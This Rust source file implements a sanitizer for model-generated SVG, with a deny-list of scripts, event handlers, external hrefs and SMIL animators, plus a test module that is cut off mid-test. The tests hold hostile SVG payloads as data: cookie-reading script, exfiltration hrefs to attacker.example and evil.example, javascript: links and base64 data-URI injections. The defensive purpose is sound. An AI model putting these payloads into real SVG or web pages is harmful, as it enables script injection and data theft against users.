//! The SVG pipeline: generate → **validate** → **sanitize** → **optimize**,
//! with a bounded repair loop (L-V2). LLM-generated
//! SVG is code generation and gets code discipline: it is mechanically
//! validated and rendered inert before it is ever written — never trusted
//! because it "looked right".
//!
//! Pure text in, pure text out — no rasterization, no network, no
//! filesystem — so the whole pipeline is unit-testable against a hostile SVG
//! corpus. (`resvg` rasterization for terminal preview, per spec §4 step 5,
//! is a caller concern; this crate's preview ladder takes ready image bytes.)
//!
//! # Validation
//! Parsed with `roxmltree` under its default options, which **reject DTDs**
//! (`<!DOCTYPE …>` / internal entities). That is a deliberate security guard:
//! it blocks XXE and billion-laughs entity-expansion vectors before they can
//! reach a downstream renderer. A parse failure yields
//! [`SvgError::Parse`] with the line/col of the offending token, which the
//! repair loop feeds back to the model.
//!
//! # Sanitization rules (each documented, all tested)
//! Because roxmltree is read-only, sanitization is a *re-serialization* pass:
//! the validated tree is walked and a **deny-list** of dangerous nodes and
//! attributes is elided — the elements in `is_dropped_element`, event-handler
//! attributes, and external/script URL references are dropped; every other
//! node/attribute is re-emitted verbatim (with text escaped). The rules:
//!
//! 1. **Drop `<script>`** (and subtree) — SVG script elements execute in a
//!    rendering context; artifacts must be inert.
//! 2. **Drop `<style>`** (and subtree) — CSS `@import`/`url(…)` inside a
//!    `<style>` block fetches off-host resources when the artifact is inlined
//!    into an HTML context, the same remote-exfil vector as rule 5.
//! 3. **Drop `<foreignObject>`** (and subtree) — it embeds arbitrary
//!    (X)HTML, i.e. an escape hatch out of the SVG deny-list.
//! 4. **Drop event-handler attributes** — any attribute whose name starts
//!    with `on` (`onload`, `onclick`, …) is script.
//! 5. **Drop external `href` / `xlink:href`** — only same-document fragment
//!    references (`#id`) survive; `http(s):`, `data:`, `javascript:`,
//!    protocol-relative, and every other target is stripped. This neutralizes
//!    remote `<image>` exfil pixels and `javascript:` navigation.
//! 6. **Drop resource-referencing attributes whose value names an external
//!    target** — the value (or any `url(…)` argument inside it) is external
//!    when it begins with a URL scheme (`<ascii-alpha>[a-z0-9+.-]*:`, so
//!    `http:`, `https:`, `data:`, `blob:`, `file:` and every future scheme
//!    are covered), begins with the protocol-relative `//host/…`, or contains
//!    `javascript:`. A bare `#fragment` and a relative path are same-document
//!    or same-directory and survive, so `fill="url(#grad)"` still paints.
//!
//!    The rule is applied **only** to attributes that can actually reference
//!    a resource — `href`, `xlink:href`, `src`, `fill`, `stroke`, `filter`,
//!    `mask`, `clip-path`, `cursor`, `marker`, `color-profile`, `style`, and
//!    the `marker-*` / `mask-*` / `*-image` / `*-source` families (see
//!    `is_resource_reference_attribute`) — and the scheme test is anchored at
//!    the start of the trimmed value. Both halves are required to avoid a
//!    false positive: a legitimate value that merely *contains* a colon
//!    (`font-family="Foo: Bar"`) is neither a resource reference nor
//!    scheme-prefixed, and must survive sanitization untouched.
//! 7. **Drop the `style` attribute** — the `<style>` *element* is dropped by
//!    rule 2, but the attribute carries the same CSS and so the same
//!    `url(…)`/`@import` off-host fetch. It is dropped outright rather than
//!    URL-filtered: parsing CSS to decide is a second parser's worth of
//!    attack surface, and an inline presentation style is never load-bearing
//!    for an artifact whose presentation attributes survive.
//! 8. **Drop foreign-namespace elements and attributes** — the serializer
//!    emits local names, so an element or attribute in any other namespace
//!    (editor metadata like `sodipodi:`/`inkscape:`) would be re-emitted
//!    unprefixed and re-parse as an SVG-namespace name it never was. The
//!    `xlink:` and `xml:` namespaces are the exceptions, re-emitted with
//!    their prefix (`xlink:href`, `xml:space`): every conformant parser
//!    binds `xml:`, and `xmlns:xlink` is re-declared on the root when used.
//!
//! # Optimization (light, step 4)
//! Comments and processing instructions are dropped; `<metadata>` elements
//! are dropped; insignificant whitespace in text is collapsed. A `viewBox` is
//! backfilled on the root from `width`/`height` when absent (spec §4 "enforce
//! a viewBox"), which keeps the artifact safely scalable when inlined.
//!
//! # Known limits (recorded, not fixed)
//! Rule 6's reach is the resource-attribute list above. An attribute outside
//! it keeps a value that happens to look like a URL — deliberate, because the
//! attributes outside the list (`d`, `transform`, `font-family`, `points`, …)
//! are not fetched by any renderer, and testing them all is what produced the
//! false positives this rule was rewritten to avoid. A *new* SVG attribute
//! that dereferences its value therefore has to be added to
//! `is_resource_reference_attribute` in the same change that makes the
//! sanitizer aware of it. Presentation CSS is lost rather than filtered
//! (rule 7): an artifact that relied on `style="fill:red"` renders unstyled
//! instead of insecurely.
//!
//! Rule 6 allows a *relative* reference (`fill="url(sprite.svg#g)"`), which
//! `xml:base="https://host/"` could re-base off-host. `xml:base` is removed
//! in SVG 2 and browsers dropped it years ago for this class of reason, so
//! nothing here acts on it today; closing it means either dropping `xml:base`
//! outright or refusing relative references, and that is a separate ruling
//! about how much a same-directory reference is worth (tracked on #615).

use async_trait::async_trait;
use roxmltree::{Document, Node};
use thiserror::Error;

/// The SVG namespace URI — SVG elements resolve to this; re-declared on the
/// sanitized root.
const SVG_NS: &str = "http://www.w3.org/2000/svg";
/// The XLink namespace URI — carries `xlink:href`; re-declared on the root
/// only when the tree actually uses it.
const XLINK_NS: &str = "http://www.w3.org/1999/xlink";
/// The XML namespace URI — carries `xml:space`/`xml:lang`. Its `xml:` prefix
/// is bound by every conformant parser and never needs declaring.
const XML_NS: &str = "http://www.w3.org/XML/1998/namespace";

/// Recommended attempt budget for [`SvgPipeline::generate`]: one initial
/// generation plus two repair rounds.
pub const DEFAULT_SVG_ATTEMPTS: u32 = 3;

/// A named SVG failure. `Parse` carries the line/col of the offending token
/// (L-V2: mechanical validation, precise feedback).
#[derive(Error, Debug, Clone, PartialEq, Eq)]
pub enum SvgError {
    /// The text did not parse as XML/SVG (includes a rejected DTD).
    #[error("SVG parse error at {line}:{col}: {message}")]
    Parse {
        line: u32,
        col: u32,
        message: String,
    },
    /// The document's root element is not `<svg>`.
    #[error("SVG root element is not <svg>")]
    NoSvgRoot,
    /// The repair loop ran out of attempts without producing valid SVG.
    #[error("SVG repair exhausted after {attempts} attempt(s); last error: {last}")]
    RepairExhausted { attempts: u32, last: String },
    /// The element tree is nested deeper than [`MAX_NESTING_DEPTH`]. Rejected
    /// before parsing and again before sanitization, because both the parser
    /// and the serializer recurse per level and would otherwise overflow the
    /// stack — aborting the process on hostile model output.
    #[error("SVG nested too deeply (> {MAX_NESTING_DEPTH} levels)")]
    TooDeeplyNested,
}

/// Maximum element nesting depth accepted. Real SVG art is a few dozen levels
/// at most; anything past this is either broken or an attempt to overflow one
/// of the two recursive walks over the document (roxmltree's tokenizer and
/// this module's serializer). Kept well below a worker thread's stack budget.
pub const MAX_NESTING_DEPTH: usize = 256;

/// An upper bound on element nesting read straight from the raw text, used to
/// reject a hostile document BEFORE it is parsed. roxmltree's tokenizer
/// descends per nesting level (`parse_element` ↔ `parse_content` are mutually
/// recursive), so an over-deep document overflows the stack *inside the
/// parser* — there is no post-parse check that could run in time. Hence a
/// textual scan, and hence its precision matters: an imprecise scan is a
/// bypass, not a false alarm.
///
/// It walks markup rather than counting bytes, because bytes lie:
/// * `>` and `/` are legal unescaped inside an attribute value, so a naive
///   "`/>` decrements" rule reads a document of `<g d="/>">` elements as
///   depth-neutral while it nests without bound. Attribute values are
///   therefore skipped by tracking the opening quote.
/// * comments, CDATA, and processing instructions may contain anything at
///   all, including `<`, so each is skipped whole to its terminator.
///
/// For well-formed input the result is the exact maximum depth, so no valid
/// SVG is ever rejected for nesting it does not have. Malformed input is
/// rejected at parse anyway.
fn raw_element_depth_exceeds(text: &str, max: usize) -> bool {
    let b = text.as_bytes();
    let mut depth = 0usize;
    let mut i = 0;
    while i < b.len() {
        // Character data cannot contain an unescaped `<`, so only a `<` can
        // start something that changes depth.
        if b[i] != b'<' {
            i += 1;
            continue;
        }
        if b[i..].starts_with(b"<!--") {
            i = skip_past(b, i + 4, b"-->");
            continue;
        }
        if b[i..].starts_with(b"<![CDATA[") {
            i = skip_past(b, i + 9, b"]]>");
            continue;
        }
        match b.get(i + 1) {
            // A processing instruction ends at `?>`; a declaration (`<!…`,
            // e.g. a DTD, which the parser rejects outright) at the first `>`.
            Some(b'?') => {
                i = skip_past(b, i + 2, b"?>");
                continue;
            }
            Some(b'!') => {
                i = skip_past(b, i + 2, b">");
                continue;
            }
            _ => {}
        }

        let is_close = b.get(i + 1) == Some(&b'/');
        // Walk to the tag's real end, skipping quoted attribute values so a
        // `>` or `/>` inside one cannot be mistaken for it.
        let mut end = i + 1;
        let mut quote: Option<u8> = None;
        while end < b.len() {
            let byte = b[end];
            match quote {
                Some(open) => {
                    if byte == open {
                        quote = None;
                    }
                }
                None => {
                    if byte == b'"' || byte == b'\'' {
                        quote = Some(byte);
                    } else if byte == b'>' {
                        break;
                    }
                }
            }
            end += 1;
        }
        let is_self_closing = end > i + 1 && b[end - 1] == b'/';
        if is_close {
            depth = depth.saturating_sub(1);
        } else if !is_self_closing {
            depth += 1;
            if depth > max {
                return true;
            }
        }
        i = end + 1;
    }
    false
}

/// The index just past the first `needle` at or after `from`, or the end of
/// `b` when there is none (an unterminated comment/PI — malformed input the
/// parser rejects, so consuming the rest is the safe reading).
fn skip_past(b: &[u8], from: usize, needle: &[u8]) -> usize {
    b[from..]
        .windows(needle.len())
        .position(|window| window == needle)
        .map_or(b.len(), |offset| from + offset + needle.len())
}

/// Whether the parsed element tree nests deeper than `max` levels. The second
/// half of the depth guard: [`raw_element_depth_exceeds`] keeps the *parser's*
/// recursion bounded, this keeps the *serializer's* (and [`contains_xlink`]'s)
/// bounded against the tree roxmltree actually built, whatever the text
/// looked like. Iterative on purpose — a guard against recursion must not
/// recurse.
fn element_depth_exceeds(root: Node, max: usize) -> bool {
    let mut stack = vec![(root, 1usize)];
    while let Some((node, depth)) = stack.pop() {
        if depth > max {
            return true;
        }
        for child in node.children() {
            if child.is_element() {
                stack.push((child, depth + 1));
            }
        }
    }
    false
}

/// The result of processing: the sanitized, optimized SVG text and a
/// human-readable list of what sanitization removed (for reporting to the
/// user — "stripped 1 `<script>`, 1 external @href").
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct ProcessedSvg {
    pub svg: String,
    pub removed: Vec<String>,
}

/// A model-backed SVG generator, injected by CLI glue (this crate must not
/// depend on `stella-model`). `prior_error` carries the previous attempt's
/// parse/validation failure so the model can repair it.
#[async_trait]
pub trait SvgGenerator: Send + Sync {
    async fn generate(&self, prompt: &str, prior_error: Option<&str>) -> String;
}

/// The stateless SVG pipeline.
pub struct SvgPipeline;

impl SvgPipeline {
    /// Validate → sanitize → optimize a single SVG string. Pure and
    /// deterministic; the core of L-V2. Never emits an artifact that did not
    /// parse.
    pub fn process(svg_text: &str) -> Result<ProcessedSvg, SvgError> {
        // Reject a pathologically deep document BEFORE parsing: roxmltree's
        // tokenizer recurses per nesting level, so an over-deep tree would
        // overflow the stack and abort the process inside `Document::parse`.
        if raw_element_depth_exceeds(svg_text, MAX_NESTING_DEPTH) {
            return Err(SvgError::TooDeeplyNested);
        }
        let doc = Document::parse(svg_text).map_err(|e| {
            let pos = e.pos();
            SvgError::Parse {
                line: pos.row,
                col: pos.col,
                message: e.to_string(),
            }
        })?;
        let root = doc.root_element();
        // …and again against the tree that was actually built, so the
        // recursive serializer below is bounded by what it will walk rather
        // than by a reading of the text.
        if element_depth_exceeds(root, MAX_NESTING_DEPTH) {
            return Err(SvgError::TooDeeplyNested);
        }
        if !root.tag_name().name().eq_ignore_ascii_case("svg") {
            return Err(SvgError::NoSvgRoot);
        }
        let mut removed = Vec::new();
        let svg = serialize_element(root, &mut removed, true);
        Ok(ProcessedSvg { svg, removed })
    }

    /// Generate SVG through `generator` with a bounded repair loop: up to
    /// `max_attempts` tries, feeding each parse/validation error back into
    /// the next generation, then failing with the last error
    /// (the loop always terminates).
    /// `max_attempts` is clamped to at least 1.
    pub async fn generate(
        generator: &dyn SvgGenerator,
        prompt: &str,
        max_attempts: u32,
    ) -> Result<ProcessedSvg, SvgError> {
        let attempts = max_attempts.max(1);
        let mut prior_error: Option<String> = None;
        let mut last = "no attempt made".to_string();
        for _ in 0..attempts {
            let candidate = generator.generate(prompt, prior_error.as_deref()).await;
            match Self::process(&candidate) {
                Ok(processed) => return Ok(processed),
                Err(err) => {
                    last = err.to_string();
                    prior_error = Some(last.clone());
                }
            }
        }
        Err(SvgError::RepairExhausted { attempts, last })
    }
}

// serialization (deny-list walk)

/// Elements dropped entirely, subtree and all: `<script>`, `<style>`,
/// `<foreignObject>` (sanitization rules 1–3) and `<metadata>` (optimization),
/// plus the SMIL animation elements. Case-insensitive so a `<SCRIPT>` variant
/// can't slip through. `<style>` is dropped because its CSS can pull off-host
/// resources via `@import`/`url(…)` — the same exfil vector
/// [`references_external`] blocks in attribute values.
///
/// The SMIL animation elements (`<animate>`, `<set>`, `<animateTransform>`,
/// `<animateMotion>`, `<animateColor>`) are dropped because they *mutate*
/// another attribute at runtime — e.g. `<animate attributeName="xlink:href"
/// to="http://evil/…">` re-points an href to an external target after load.
/// [`keep_attribute`] only vets an element's own initial attribute values, so
/// it never sees the animated one; dropping the animators closes that bypass,
/// and static sanitized SVGs (previews/artifacts) need no animation.
fn is_dropped_element(local: &str) -> bool {
    local.eq_ignore_ascii_case("script")
        || local.eq_ignore_ascii_case("style")
        || local.eq_ignore_ascii_case("foreignObject")
        || local.eq_ignore_ascii_case("metadata")
        || local.eq_ignore_ascii_case("animate")
        || local.eq_ignore_ascii_case("set")
        || local.eq_ignore_ascii_case("animateTransform")
        || local.eq_ignore_ascii_case("animateMotion")
        || local.eq_ignore_ascii_case("animateColor")
}

/// Decide whether an attribute (by lowercased emit-name and value) survives.
/// The rule numbers are the sanitization rules in this module's docs.
fn keep_attribute(name_low: &str, value: &str) -> bool {
    // Rule 4: event handlers.
    if name_low.starts_with("on") {
        return false;
    }
    // Rule 5: only same-document fragment hrefs survive.
    if name_low == "href" || name_low == "xlink:href" {
        return value.trim_start().starts_with('#');
    }
    // Rule 7: the `style` attribute carries the same CSS as the `<style>`
    // element rule 2 drops, so it is dropped for the same reason.
    if name_low == "style" {
        return false;
    }
    // Rule 6: an external/script URL reference, but only where the attribute
    // can actually dereference its value.
    if is_resource_reference_attribute(name_low) && references_external(value) {
        return false;
    }
    true
}

/// Attributes whose value a renderer can dereference — the only ones rule 6
/// inspects. Restricting the scan is what keeps a legitimate value that
/// merely contains a colon (`font-family="Foo: Bar"`, a `transform`, a path
/// `d`) from being mistaken for a URL scheme. `style` is listed for
/// completeness even though rule 7 drops it before rule 6 is reached.
///
/// Every entry has a keyword-or-URL value grammar, never free text, so
/// widening this list carries no false-positive risk — which is why the
/// shape rules at the end are preferred over enumerating a moving target:
///
/// * `marker-` — `marker-start` / `marker-mid` / `marker-end` (`<funciri>`).
/// * `mask-` — CSS Masking's `mask-image`, `mask-border-source`; the
///   non-referencing siblings (`mask-type`, `mask-mode`, `mask-repeat`) hold
///   keywords and are unaffected by being scanned.
/// * `-image` / `-source` — the CSS `<image>`-valued properties SVG 2 exposes
///   as presentation attributes (`background-image`, `border-image-source`,
///   `list-style-image`).
///
/// `cursor` is the one that got away in the first cut of this rule:
/// `cursor="url(evil.svg), auto"` is valid SVG 1.1 and is fetched, exactly
/// like `fill="url(…)"`. `marker` and `color-profile` are here defensively —
/// SVG 1.1 makes `marker` a property but *not* a presentation attribute, and
/// `color-profile` is gone in SVG 2, so a conformant renderer ignores both as
/// XML attributes; a lenient one does not, and neither costs anything.
fn is_resource_reference_attribute(name_low: &str) -> bool {
    matches!(
        name_low,
        "href"
            | "xlink:href"
            | "src"
            | "fill"
            | "stroke"
            | "filter"
            | "mask"
            | "clip-path"
            | "cursor"
            | "marker"
            | "color-profile"
            | "style"
    ) || name_low.starts_with("marker-")
        || name_low.starts_with("mask-")
        || name_low.ends_with("-image")
        || name_low.ends_with("-source")
}

/// Whether a resource-referencing value names an external target: the value
/// itself, or any `url(…)` argument inside it, is scheme-prefixed or
/// protocol-relative — or the value contains the `javascript:` pseudo-scheme
/// anywhere. Case-insensitive.
fn references_external(value: &str) -> bool {
    let trimmed = value.trim();
    if is_external_target(trimmed) {
        return true;
    }
    let low = trimmed.to_ascii_lowercase();
    if low.contains("javascript:") {
        return true;
    }
    // `url(<target>)` is CSS functional notation: how paint servers, filters,
    // masks and markers name what they reference. ASCII-lowercasing is
    // byte-length preserving, so offsets found in `low` index `trimmed`.
    let mut cursor = 0usize;
    while let Some(offset) = low[cursor..].find("url(") {
        let start = cursor + offset + "url(".len();
        let end = trimmed[start..]
            .find(')')
            .map_or(trimmed.len(), |i| start + i);
        if is_external_target(&trimmed[start..end]) {
            return true;
        }
        cursor = start;
    }
    false
}

/// Whether one reference target points off-document: it carries a URL scheme
/// or is protocol-relative. A bare `#fragment` (same document) and a relative
/// path (same directory) are neither.
fn is_external_target(raw: &str) -> bool {
    let target = raw.trim().trim_matches(['"', '\'']).trim();
    target.starts_with("//") || starts_with_url_scheme(target)
}

/// Whether `text` begins with an RFC 3986 scheme: an ASCII letter followed by
/// any number of `[A-Za-z0-9+.-]`, then `:`. Anchored at the start on purpose
/// — a colon later in a value (`font-family="Foo: Bar"`) is punctuation, not
/// a scheme, and treating it as one is the false positive that blocked this
/// rule from landing.
fn starts_with_url_scheme(text: &str) -> bool {
    let mut bytes = text.bytes();
    if !bytes.next().is_some_and(|b| b.is_ascii_alphabetic()) {
        return false;
    }
    for byte in bytes {
        match byte {
            b':' => return true,
            b if b.is_ascii_alphanumeric() || matches!(b, b'+' | b'.' | b'-') => {}
            _ => return false,
        }
    }
    false
}

/// Does the subtree use any XLink-namespaced attribute? Governs whether the
/// root re-declares `xmlns:xlink` (declaring an undeclared prefix would make
/// the output malformed).
fn contains_xlink(node: Node) -> bool {
    if node.attributes().any(|a| a.namespace() == Some(XLINK_NS)) {
        return true;
    }
    node.children().any(|c| c.is_element() && contains_xlink(c))
}

/// Serialize one element (assumed already checked as not-dropped) and its
/// surviving descendants into sanitized SVG text.
fn serialize_element(node: Node, removed: &mut Vec<String>, is_root: bool) -> String {
    let local = node.tag_name().name();
    let mut out = String::new();
    out.push('<');
    out.push_str(local);

    if is_root {
        out.push_str(" xmlns=\"");
        out.push_str(SVG_NS);
        out.push('"');
        if contains_xlink(node) {
            out.push_str(" xmlns:xlink=\"");
            out.push_str(XLINK_NS);
            out.push('"');
        }
    }

    let mut has_viewbox = false;
    let mut width = None;
    let mut height = None;
    for attr in node.attributes() {
        // Rule 8: only the null, XLink, and XML namespaces re-emit — the
        // latter two with the prefix their namespace guarantees. Any other
        // namespace would come back unprefixed as a name it never was.
        let emit_name = match attr.namespace() {
            None => attr.name().to_string(),
            Some(XLINK_NS) => format!("xlink:{}", attr.name()),
            Some(XML_NS) => format!("xml:{}", attr.name()),
            Some(_) => {
                removed.push(format!("@{} on <{local}> (foreign namespace)", attr.name()));
                continue;
            }
        };
        let name_low = emit_name.to_ascii_lowercase();

        if is_root {
            match name_low.as_str() {
                "viewbox" => has_viewbox = true,
                "width" => width = parse_length(attr.value()),
                "height" => height = parse_length(attr.value()),
                _ => {}
            }
        }

        if !keep_attribute(&name_low, attr.value()) {
            removed.push(format!("@{emit_name} on <{local}>"));
            continue;
        }
        out.push(' ');
        out.push_str(&emit_name);
        out.push_str("=\"");
        out.push_str(&escape_attr(attr.value()));
        out.push('"');
    }

    // Backfill a viewBox on the root from width/height when absent.
    if is_root
        && !has_viewbox
        && let (Some(w), Some(h)) = (width, height)
    {
        out.push_str(&format!(" viewBox=\"0 0 {} {}\"", fmt_num(w), fmt_num(h)));
    }

    let mut inner = String::new();
    for child in node.children() {
        if child.is_comment() || child.is_pi() {
            continue; // optimize: drop comments/PIs
        }
        if child.is_text() {
            if let Some(text) = child.text() {
                let collapsed = collapse_whitespace(text);
                if !collapsed.is_empty() {
                    inner.push_str(&escape_text(&collapsed));
                }
            }
            continue;
        }
        if child.is_element() {
            let child_local = child.tag_name().name();
            // Rule 8: a foreign-namespace element would be re-emitted
            // unprefixed and re-parse as SVG — dropped, subtree and all.
            if child.tag_name().namespace().is_some_and(|ns| ns != SVG_NS) {
                removed.push(format!("<{child_local}> element (foreign namespace)"));
                continue;
            }
            if is_dropped_element(child_local) {
                removed.push(format!("<{child_local}> element"));
                continue;
            }
            inner.push_str(&serialize_element(child, removed, false));
        }
    }

    if inner.is_empty() {
        out.push_str("/>");
    } else {
        out.push('>');
        out.push_str(&inner);
        out.push_str("</");
        out.push_str(local);
        out.push('>');
    }
    out
}

/// Parse a positive numeric length, tolerating a `px` unit; anything with a
/// non-px unit or non-positive value yields `None` (no viewBox backfill).
fn parse_length(raw: &str) -> Option<f64> {
    let trimmed = raw.trim().trim_end_matches("px").trim();
    let value: f64 = trimmed.parse().ok()?;
    if value.is_finite() && value > 0.0 {
        Some(value)
    } else {
        None
    }
}

/// Render a number without a trailing `.0` for whole values.
fn fmt_num(value: f64) -> String {
    if (value.fract()).abs() < 1e-9 {
        format!("{}", value as i64)
    } else {
        format!("{value}")
    }
}

/// Collapse runs of whitespace to a single space and trim the ends.
fn collapse_whitespace(text: &str) -> String {
    let mut out = String::with_capacity(text.len());
    let mut prev_ws = false;
    for ch in text.chars() {
        if ch.is_whitespace() {
            if !prev_ws {
                out.push(' ');
                prev_ws = true;
            }
        } else {
            out.push(ch);
            prev_ws = false;
        }
    }
    out.trim().to_string()
}

fn escape_text(text: &str) -> String {
    text.replace('&', "&amp;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
}

fn escape_attr(text: &str) -> String {
    escape_text(text).replace('"', "&quot;")
}

#[cfg(test)]
mod tests {
    use super::*;

    fn process(text: &str) -> ProcessedSvg {
        SvgPipeline::process(text).expect("should process")
    }

    #[test]
    fn valid_svg_round_trips_and_keeps_geometry() {
        let out = process(
            r##"<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><rect x="1" y="1" width="8" height="8" fill="#f60"/></svg>"##,
        );
        assert!(out.svg.contains("<rect"));
        assert!(out.svg.contains("fill=\"#f60\""));
        assert!(out.svg.contains("viewBox=\"0 0 10 10\""));
        assert!(out.removed.is_empty());
    }

    #[test]
    fn script_element_is_stripped_injection_case() {
        let out = process(
            r#"<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.cookie)</script><rect/></svg>"#,
        );
        assert!(!out.svg.contains("script"), "{}", out.svg);
        assert!(!out.svg.contains("alert"), "{}", out.svg);
        assert!(out.svg.contains("<rect"));
        assert!(out.removed.iter().any(|r| r.contains("script")));
    }

    #[test]
    fn smil_animation_elements_are_dropped_including_href_smuggling() {
        // #821: `<animate>` (and its SMIL siblings) can re-point an href to an
        // external target at runtime — `keep_attribute` only vets the initial
        // value, so it never sees the animated one. All animators are dropped
        // subtree-and-all, taking the smuggled URL / `javascript:` with them.
        let out = process(
            r##"<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="#a"><animate attributeName="xlink:href" to="https://evil.example/leak"/></image><set attributeName="href" to="javascript:steal()"/><animateTransform attributeName="transform" type="rotate"/><animateMotion path="M0,0"/><rect width="1" height="1"/></svg>"##,
        );
        for banned in ["<animate", "<set", "evil.example", "javascript:", "steal"] {
            assert!(!out.svg.contains(banned), "leaked {banned:?}:\n{}", out.svg);
        }
        // The benign geometry survives, and the drop is recorded.
        assert!(out.svg.contains("<rect"), "{}", out.svg);
        assert!(out.removed.iter().any(|r| r.contains("animate")));
    }

    #[test]
    fn event_handler_attributes_are_stripped() {
        let out = process(
            r#"<svg xmlns="http://www.w3.org/2000/svg"><rect onload="steal()" onclick="x()" width="1" height="1"/></svg>"#,
        );
        assert!(!out.svg.contains("onload"), "{}", out.svg);
        assert!(!out.svg.contains("onclick"), "{}", out.svg);
        assert!(!out.svg.contains("steal"), "{}", out.svg);
        assert!(out.svg.contains("width=\"1\""));
    }

    #[test]
    fn external_image_href_exfil_is_stripped() {
        // OWASP-style exfil: an <image> pulling a tracking pixel off-host.
        let out = process(
            r#"<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="http://attacker.example/collect?c=secret" x="0" y="0"/></svg>"#,
        );
        assert!(!out.svg.contains("attacker.example"), "{}", out.svg);
        assert!(!out.svg.contains("secret"), "{}", out.svg);
        // the <image> element survives but references nothing external
        assert!(out.svg.contains("<image"));
        assert!(out.removed.iter().any(|r| r.contains("href")));
    }

    #[test]
    fn javascript_href_is_stripped_but_fragment_href_survives() {
        let out = process(
            r##"<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><a xlink:href="javascript:alert(1)"><rect/></a><use href="#icon"/></svg>"##,
        );
        assert!(!out.svg.contains("javascript"), "{}", out.svg);
        assert!(out.svg.contains("href=\"#icon\""), "{}", out.svg);
    }

    #[test]
    fn style_element_with_remote_css_is_stripped() {
        // CSS @import / url() inside <style> fetches off-host when the artifact
        // is inlined into HTML — the same exfil class as an external href.
        let out = process(
            r#"<svg xmlns="http://www.w3.org/2000/svg"><style>@import url("http://attacker.example/x.css");</style><rect/></svg>"#,
        );
        assert!(!out.svg.contains("style"), "{}", out.svg);
        assert!(!out.svg.contains("attacker.example"), "{}", out.svg);
        assert!(!out.svg.contains("@import"), "{}", out.svg);
        assert!(out.svg.contains("<rect"));
        assert!(out.removed.iter().any(|r| r.contains("style")));
    }

    #[test]
    fn protocol_relative_url_reference_is_stripped() {
        // `//host/…` (protocol-relative) is external too — it inherits the
        // page's scheme when inlined, so a paint-server pointing at it exfils.
        let out = process(
            r##"<svg xmlns="http://www.w3.org/2000/svg"><rect fill="url(//attacker.example/x)" stroke="#000"/></svg>"##,
        );
        assert!(!out.svg.contains("attacker.example"), "{}", out.svg);
        assert!(out.svg.contains("stroke=\"#000\""), "{}", out.svg);
        assert!(out.removed.iter().any(|r| r.contains("fill")));
    }

    #[test]
    fn external_url_in_paint_value_is_stripped() {
        let out = process(
            r##"<svg xmlns="http://www.w3.org/2000/svg"><rect fill="url(http://attacker.example/x)" stroke="#000"/></svg>"##,
        );
        assert!(!out.svg.contains("attacker.example"), "{}", out.svg);
        assert!(out.svg.contains("stroke=\"#000\""));
    }

    #[test]
    fn style_attribute_is_dropped_with_its_data_uri_payload() {
        // The `<style>` element was already dropped (rule 2); the attribute
        // carries the same CSS and so the same off-host fetch (rule 7).
        let out = process(
            r##"<svg xmlns="http://www.w3.org/2000/svg"><rect style="background-image:url(data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9ImFsZXJ0KDEpIi8+)" fill="#111"/></svg>"##,
        );
        assert!(!out.svg.contains("style"), "{}", out.svg);
        assert!(!out.svg.contains("data:"), "{}", out.svg);
        assert!(!out.svg.contains("base64"), "{}", out.svg);
        assert!(out.svg.contains("fill=\"#111\""), "{}", out.svg);
        assert!(out.removed.iter().any(|r| r.contains("style")));
    }

    #[test]
    fn data_uri_targets_are_stripped_everywhere_they_can_be_dereferenced() {
        // Each of these survived the old `//`-substring test: a `data:` URI
        // has no `//` at all, so an inlined artifact re-opened the
        // active-content vector the sanitizer exists to close.
        let hostile = [
            (
                r##"<rect fill="url(data:image/svg+xml;base64,PHN2Zy8+)" stroke="#000"/>"##,
                "fill",
            ),
            (
                r##"<rect filter="url(data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)" stroke="#000"/>"##,
                "filter",
            ),
            (
                r##"<path marker-end="url(data:image/svg+xml,%3Csvg/%3E)" stroke="#000"/>"##,
                "marker-end",
            ),
            (
                r##"<rect mask="url(data:text/html,x)" stroke="#000"/>"##,
                "mask",
            ),
            (
                r##"<rect clip-path="url(data:text/html,x)" stroke="#000"/>"##,
                "clip-path",
            ),
            (
                r##"<rect cursor="url(data:image/svg+xml;base64,AAAA), auto" stroke="#000"/>"##,
                "cursor",
            ),
            (
                r##"<rect mask-image="url(data:image/svg+xml,x)" stroke="#000"/>"##,
                "mask-image",
            ),
        ];
        for (fragment, attribute) in hostile {
            let out = process(&format!(
                r#"<svg xmlns="http://www.w3.org/2000/svg">{fragment}</svg>"#
            ));
            assert!(!out.svg.contains("data:"), "{attribute}: {}", out.svg);
            assert!(
                out.removed.iter().any(|r| r.contains(attribute)),
                "{attribute} was not reported as removed: {:?}",
                out.removed
            );
            assert!(out.svg.contains("stroke=\"#000\""), "{}", out.svg);
        }
    }

    #[test]
    fn cursor_url_references_are_stripped_but_keyword_cursors_survive() {
        // `cursor="url(…), auto"` is valid SVG 1.1 and IS fetched, so it is
        // the same off-host class as `fill="url(…)"` — it was missed in the
        // first cut of rule 6.
        for (fragment, marker) in [
            (
                r##"<rect cursor="url(data:image/svg+xml;base64,AAAA), auto" fill="#111"/>"##,
                "data:",
            ),
            (
                r##"<rect cursor="url(https://evil.example/c.svg), auto" fill="#111"/>"##,
                "evil.example",
            ),
        ] {
            let out = process(&format!(
                r#"<svg xmlns="http://www.w3.org/2000/svg">{fragment}</svg>"#
            ));
            assert!(!out.svg.contains(marker), "{}", out.svg);
            assert!(!out.svg.contains("cursor"), "{}", out.svg);
            assert!(
                out.removed.iter().any(|r| r.contains("cursor")),
                "the dropped cursor must be reported: {:?}",
                out.removed
            );
            assert!(out.svg.contains("fill=\"#111\""), "{}", out.svg);
        }

        // A keyword cursor carries no scheme, so it must survive untouched —
        // the common case, and the one a false-positive-prone rule breaks.
        let out = process(
            r##"<svg xmlns="http://www.w3.org/2000/svg"><rect cursor="pointer" fill="#111"/><rect cursor="url(#hand), auto"/><rect mask-type="alpha"/></svg>"##,
        );
        assert!(
            out.removed.is_empty(),
            "legitimate cursors must survive: {:?}",
            out.removed
        );
        assert!(out.svg.contains(r#"cursor="pointer""#), "{}", out.svg);
        assert!(out.svg.contains("url(#hand)"), "{}", out.svg);
